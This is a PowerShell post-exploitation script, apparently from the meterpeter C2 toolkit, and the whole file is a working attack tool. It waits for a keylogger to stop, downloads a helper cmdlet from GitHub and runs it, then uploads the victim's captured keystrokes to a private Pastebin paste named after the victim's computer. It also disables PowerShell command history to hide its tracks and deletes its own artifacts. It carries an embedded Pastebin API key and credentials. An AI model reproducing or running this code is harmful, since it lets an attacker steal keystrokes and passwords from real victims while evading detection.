<#
.SYNOPSIS
   Send keylogger logfile data to pastebin.
    
   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19042) x64 bits
   Required Dependencies: void.log {meterpeter log}
   Optional Dependencies: Out-PasteBin.ps1 {auto}
   PS cmdlet Dev version: v1.0.1
   
.DESCRIPTION
   Uses Out-PasteBin.ps1 cmdlet to take the content from @Meterpeter C2
   logfile and creates a new pastebin paste from it on sellected account

.NOTES
   PasteBin accepts the max of 20 pastes per day on 'free' accounts.
   
.Parameter PastebinUsername
   PasteBin UserName to authenticate to

.Parameter PastebinPassword
   PasteBin Password to authenticate to

.Parameter ExpiresIn
   Never: N, 10 Minutes: 10M, 1 Hour: 1H, 1 Day: 1D, 1 Week: 1W, 2 Weeks: 2W, 1 Month: 1M

.Parameter PastebinDeveloperKey
   The pasteBin API key to authenticate

.Parameter TimeOut
   Loop function timeout in seconds (default: 5)

.EXAMPLE
   PS C:\> Get-Help .\SendToPasteBin.ps1 -full
   Access this cmdlet comment based help!

.EXAMPLE
   PS C:\> .\SendToPasteBin.ps1 -PastebinUsername "r00t-3xp10it" -PastebinPassword "MyS3cr3TPassword" -ExpiresIn "1W"
   Send @Meterpeter C2 keylogger logfile contents to pastebin as 'private' visibility with expire in '1 Week' flag.

.INPUTS
   None. You cannot pipe objects into SendToPasteBin.ps1

.OUTPUTS
   * Out-PasteBin aux cmdlet
   * Keylogger process not found ..
   * Downloading Out-PasteBin cmdlet ..
   * Importing\Executing cmdlet ..

   * Out-PasteBin cmdlet by BankSecurity
   * PastebinDeveloperKey : 1ab4a1a4e39c94db4f653127a45e7159
     + PastebinUsername   : r00t-3xp10it
     + PasteTitle         : SKYNET_15_33_15
   * PasteBin Url: https://pastebin.com/jVT6BKWL
   * PasteBin accepts the max of 20 pastes per day.

   * Cleanup artifacts ..
  
.LINK
   https://github.com/r00t-3xp10it/meterpeter
   https://github.com/r00t-3xp10it/redpill/blob/main/bin/Out-Pastebin.ps1
#>


#CmdLet Global variable declarations!
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$PastebinDeveloperKey='1ab4a1a4e39c94db4f653127a45e7159',
   [string]$PastebinUsername="r00t-3xp10it",
   [string]$PastebinPassword="s3cr3t",
   [string]$ExpiresIn="1W",
   [string]$Egg="False",
   [int]$TimeOut='5'
)


$cmdletVersion = "v1.0.1"
$ErrorActionPreference = "SilentlyContinue"
#Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$host.UI.RawUI.WindowTitle = "@SendToPasteBin $cmdletVersion {SSA@RedTeam}"
If($Egg -ieq "False")
{
   write-host "`n* Out-PasteBin aux cmdlet" -ForegroundColor Green
}


#lOOP
while($true)
{
   #Make sure the Keylogger process its not running!
   $PIDS = (Get-Process -Name "void" -EA SilentlyContinue).Id
   If($PIDS)
   {
      If($Egg -ieq "False")
      {
         write-host "*" -ForegroundColor Red -NoNewline;
         write-host " Keylogger process is still running .." -ForegroundColor DarkGray
         write-host "  => Sleeping for '$TimeOut' seconds .." -ForegroundColor DarkYellow
      }

      #Sleep before the next loop jump
      Start-Sleep -Seconds $TimeOut
   }
   Else
   {
      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Helper - Download\Execute Out-PasteBin cmdlet

      .NOTES
         At this stage the cmdlet did NOT find the Keylogger process running,
         so it checks for Keylogger logfile existence before trying to paste
         the contents of -InputObject 'string' on sellected pastebin account.
      #>

      If($Egg -ieq "False")
      {
         write-host "*" -ForegroundColor Green -NoNewline;
         write-host " Keylogger process not found .." -ForegroundColor DarkGray
         Start-Sleep -Milliseconds 700
      }

      #Make sure that Keylogger logfile exists
      If(Test-path -Path "$Env:TMP\void.log")
      {

         If($Egg -ieq "False")
         {
            write-host "*" -ForegroundColor Green -NoNewline;
            write-host " Downloading Out-PasteBin cmdlet .." -ForegroundColor DarkGray
            Start-Sleep -Milliseconds 400
         }

         #Download Out-Pastebin cmdlet from my github repository
         iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Out-Pastebin.ps1" -OutFile "$Env:TMP\Out-Pastebin.ps1"|Unblock-File

         If($Egg -ieq "False")
         {
            write-host "*" -ForegroundColor Green -NoNewline;
            write-host " Importing\Executing cmdlet .." -ForegroundColor DarkGray
            Start-Sleep -Milliseconds 700
         }

         #Parse kelogger data (void.log)
         $ParseDatas = Get-Content -Path "$Env:TMP\void.log"
         $Diplaydata = $ParseDatas  -replace "\[ENTER\]","`r`n" -replace "</time>","</time>`r`n" -replace "\[RIGHT\]",""  -replace "\[CTRL\]","" -replace "\[BACKSPACE\]","" -replace "\[DOWN\]","" -replace "\[LEFT\]","" -replace "\[UP\]","" -replace "\[WIN KEY\]r","" -replace "\[CTRL\]v","" -replace "\[CTRL\]c","" -replace "ALT DIREITO2","@" -replace "ALT DIREITO",""
         echo $Diplaydata > "$Env:TMP\ParseData.log"

         Try{
            #Import \ Execute module
            $rand = (Get-Date -Format 'HH:mm:ss') -replace ':','_'
            Import-Module -Name "$Env:TMP\Out-PasteBin.ps1" -Force
            Out-Pastebin -InputObject $(Get-Content -Path "$Env:TMP\ParseData.log") -PasteTitle "${Env:COMPUTERNAME}_${rand}" -ExpiresIn "$ExpiresIn" -Visibility "Private" -PastebinUsername "$PastebinUsername" -PastebinPassword "$PastebinPassword" -PastebinDeveloperKey "$PastebinDeveloperKey"
         }
         Catch
         {
            If($Egg -ieq "False")
            {
               #Cleanup
               write-host "* Error:" -ForegroundColor Red -NoNewline;
               write-host " Fail to execute Out-PasteBin cmdlet .." -ForegroundColor DarkGray
               Remove-Item -Path "$Env:TMP\Out-PasteBin.ps1" -Force
               Remove-Item -Path "$Env:TMP\parsedata.log" -Force
               break
            }          
         }

         If($Egg -ieq "False")
         {
            write-host "*" -ForegroundColor Green -NoNewline;
            write-host " Cleanup artifacts .." -ForegroundColor DarkGray
            Start-Sleep -Milliseconds 700
         }

         #Cleanup
         If($Egg -ieq "False"){write-host ""}
         Remove-Item -Path "$Env:TMP\void.log" -Force
         Remove-Item -Path "$Env:TMP\parsedata.log" -Force
         Remove-Item -Path "$Env:TMP\Out-PasteBin.ps1" -Force
         break
      }
      Else
      {
         If($Egg -ieq "False")
         {
            #Keylogger logfile missing
            write-host "*" -ForegroundColor Red -NoNewline;
            write-host " [" -ForegroundColor DarkGray -NoNewline;
            write-host "abort" -ForegroundColor Red -NoNewline;
            write-host "] Keylogger logfile missing .." -ForegroundColor DarkGray;
            Start-Sleep -Milliseconds 700
         }
         break
      }
   }
}

#Auto-Delete this cmdlet in the end
#Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
